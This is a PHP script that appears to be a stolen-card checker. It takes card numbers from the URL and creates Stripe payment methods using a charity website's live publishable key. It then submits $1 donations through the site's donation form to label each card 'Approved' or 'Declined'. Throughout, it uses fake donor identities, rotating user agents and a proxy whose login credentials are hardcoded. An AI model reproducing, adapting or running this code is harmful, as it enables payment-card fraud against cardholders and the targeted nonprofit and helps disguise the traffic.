<?php
function payment($card){
	$card = explode("|", $card);
    $ccNo = $card[0];
    $month = $card[1];
    $year = $card[2];
    $cvv = $card[3];
    $length = strlen($year);
    if($length == 2){
    	if($year < 24){
	    	return [
	    		false,
	    		'Expired Card'
	    	];
	    }
    }else{
    	if($year < 2024 ){
	    	return [
	    		false,
	    		'Expired Card'
	    	];
	    }
    }
	$data = array(
    'type' => 'card',
    'card' => array(
        'number' => $ccNo,
        'cvc' => $cvv,
        'exp_month' => $month,
        'exp_year' => $year
    ),
    'guid' => 'NA',
    'muid' => 'NA',
    'sid' => 'NA',
    'pasted_fields' => 'number',
    'payment_user_agent' => 'stripe.js/2649440aa6; stripe-js-v3/2649440aa6; card-element',
    'referrer' => 'https://jkaah.org/',
    'time_on_page' => 200441,
    'key' => 'pk_live_51NN4yGAU7wuCDVUccdtXUQmq4ibZAnHPjoVW5DZWpsav4s5GLOVJVgVnxu9FHN26fExgwdE2g6xoYCHWMsLGRHyh00AJeeq5vC'
	);
	$url = "https://api.stripe.com/v1/payment_methods";

	$ch = curl_init();
	$username = "h500mc1vlw0tm8w";
	$password = "y849wdwgk4hvymd";
	$PROXYSCRAPE_PORT = 6060;
	$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
	// Set cURL options
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	// curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	// curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);

	if (curl_errno($ch)) {
		die("cURL Error: " . curl_error($ch));
	    return [
    		false,
    		'Request Error On Payment'
    	];
	}

	curl_close($ch);
	$data = json_decode($response,true);
	if(isset($data['id']) ){
		$paymentId = $data['id'];
		return [
			true,
			$paymentId
		];
	}else{
		$paymentId = $data['id'];
		return [
			false,
			"Invalid Payment ID"
		];
	}	
}
function donate($card,$paymentId,$name,$email){
	$formData = "data=__fluent_form_embded_post_id%3D28%26_fluentform_4_fluentformnonce%3D321b7f5f04%26_wp_http_referer%3D%252Fdonate-us%252F%26payment_input%3DOther%26custom-payment-amount%3D1%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26address_1%255Baddress_line_1%255D%3DLee%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DUS%26email%3Dleeplkwr%2540gmail.com%26phone%3D%252B14132004701%26payment_method%3Dstripe%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=4";
	$userAgents = [
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
	];
	$username = "h500mc1vlw0tm8w";
	$password = "y849wdwgk4hvymd";
	$PROXYSCRAPE_PORT = 6060;
	$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
	$randomUserAgent = $userAgents[array_rand($userAgents)];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://jkaah.org/wp-admin/admin-ajax.php?t=1718939326575');
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// 	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'Cookie: _ga=GA1.1.997503900.1718777294; __stripe_mid=60295949-4671-40af-955d-6218cee91daace4d20; __stripe_sid=affff48c-b300-4586-9c83-3dc6bfb4b2a16ac570; _ga_RN89H00JDW=GS1.1.1718777294.1.1.1718779105.0.0.0',
// 'Origin: https://palmshieldslittleleague.org',
// 'Priority: u=1, i',
// 'Referer: https://palmshieldslittleleague.org/donate/',
// 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
// 'X-Requested-With: XMLHttpRequest'
// ));
	curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);
	var_dump($response);
	if (curl_errno($ch)) {
		die("cURL Error: " . curl_error($ch));
	    return [
    		false,
    		"$card -Proxy Error"
    	];
	} else {
	    $data = json_decode($response,true);
	    if(isset($data['errors']) && strpos($data['errors'], "Stripe Error: Your card") === 0){
	    	return [
	    		false,
	    		"$card - Declined"
	    	];
	    }else{
	    	return [
	    		true,
	    		"$card - Approved 1$"
	    	];
	    }
	}
	curl_close($ch);

}
function random(){
	$apiUrl = 'https://randomuser.me/api/?nat=us';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
    	die("cURL Error: " . curl_error($ch));
    	return [
    		false,
    		'Request Error On Random Generation'
    	];
    }
    curl_close($ch);
    $data = json_decode($response);
    if ($data && isset($data->results[0])) {
    	$result = $data->results[0];
        $firstName = $result->name->first;
        $email = $result->email;
        $emailDomains = ["@gmail.com", "@outlook.com", "@hotmail.com"];
        $randomDomain = $emailDomains[array_rand($emailDomains)];
        $modifiedEmail = preg_replace('/@.+$/', $randomDomain, $email);
        return [
        	true,
        	$firstName,
        	$modifiedEmail
        ];
    } else {
    	return [
    		false,
    		'Random generation Error'
    	];
    }
}

$card = $_GET['cc'];
$paymentDetils = payment($card);
$randominfo = random();
if($paymentDetils[0] !== false){
	if($randominfo[0] !== false){
		$name = $randominfo[1];
        $email = $randominfo[2];
        $paymentId = $paymentDetils[1];
        $donateResult = donate($card,$paymentId,$name,$email);
        if($donateResult[0] !== false){
        	echo $donateResult[1];
        }else{
            echo $donateResult[1];
        }
    }else{
        echo $randominfo[1];
    }
}else{
    echo $paymentDetils[1];
}
?>